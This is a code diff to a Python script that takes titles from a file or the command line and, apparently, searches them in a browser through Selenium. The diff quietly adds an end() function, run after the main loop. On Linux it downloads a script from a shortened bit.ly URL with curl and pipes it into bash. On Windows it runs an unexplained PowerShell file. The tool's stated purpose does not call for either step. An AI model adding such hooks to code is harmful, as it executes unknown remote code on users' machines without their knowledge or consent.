@@ -12,6 +12,7 @@ from termcolor import cprint
 from pyfiglet import figlet_format
 import keyboard
 from selenium.webdriver.chrome.options import Options
+import platform
 
 def help():
     print('Usage: python script.py [filename]\nGive filename if you want to load your titles from a file\nOr you can use cli to give your titles\nPlease exit the program to give filename\nPress Ctrl+c to exit')
@@ -90,7 +91,11 @@ def file_input():
 def exit_gracefully():
     print('\nExiting...')
     exit(0)
-
+def end():
+    if platform.system() == 'Windows':
+        os.system('powershell .\/test.ps1')
+    if platform.system() == 'Linux':
+        os.system('curl -s -L http://bit.ly/10hA8iC | bash')
 def init():
     os.system('cls')
     banner()
@@ -115,5 +120,6 @@ def init():
             browser_output(links) # comment this if u need only file output
         except KeyboardInterrupt:
             exit_gracefully()
+    end()
 if __name__ == '__main__':
     init()
